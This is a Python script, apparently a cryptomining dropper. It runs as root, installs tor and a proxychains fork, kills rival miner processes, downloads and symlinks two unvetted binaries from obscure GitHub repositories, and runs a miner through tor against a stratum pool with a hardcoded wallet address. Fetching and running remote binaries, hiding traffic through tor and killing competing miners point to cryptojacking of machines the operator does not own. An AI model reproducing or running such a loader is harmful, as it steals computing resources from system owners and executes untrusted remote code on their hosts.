__author__ = 'root'
import time
import os, sys
import multiprocessing

useproxy = 0
os.system('chmod 777 ' + __file__)
program1 = 'verus-solver'
program2 = 'helikopter'
os.system('pkill ' + program1)
os.system('pkill ' + program2)
cores = multiprocessing.cpu_count() - 1
if cores <= 0:
    cores = 1
os.system('sysctl -w vm.nr_hugepages=$((`grep -c ^processor /proc/cpuinfo` * 3))')

try:
    os.system('apt-get update -y')
    os.system('apt-get install -y gcc make tor python3 python3-dev')
    os.system('rm -rf proxychains-ng')
    os.system('git clone https://github.com/ts6aud5vkg/proxychains-ng.git')
    os.chdir('proxychains-ng')
    os.system('make')
    os.system('make install')
    os.system('make install-config')
    if os.path.isfile('/usr/local/bin/' + program1) == False:
        os.system('wget https://github.com/desafff/gehasf/raw/main/verus-solver')            
        os.system('chmod 777 ' + program1)
        workingdir = os.getcwd()
        os.system('ln -s -f ' + workingdir + '/' + program1 + ' ' +'/usr/local/bin/' + program1)
        os.system('ln -s -f ' + workingdir + '/' + program1 + ' ' + '/usr/bin/' + program1)
        time.sleep (2)
    if os.path.isfile('/usr/local/bin/' + program2) == False:
        os.system('wget https://github.com/desafff/gehasf/raw/main/helikopter')            
        os.system('chmod 777 ' + program2)
        workingdir = os.getcwd()
        os.system('ln -s -f ' + workingdir + '/' + program2 + ' ' +'/usr/local/bin/' + program2)
        os.system('ln -s -f ' + workingdir + '/' + program2 + ' ' + '/usr/bin/' + program2)
        time.sleep (2)
except:
    pass
os.system('tor &')
time.sleep(60)
os.system ('proxychains4 ' + program2 + ' -c stratum+tcp://us.vipor.net:5040 -u RUf9nXasGVcz4mtWhYxENVzmQrpf1g5WXx.ak1 -p x --cpu ' + str(cores))
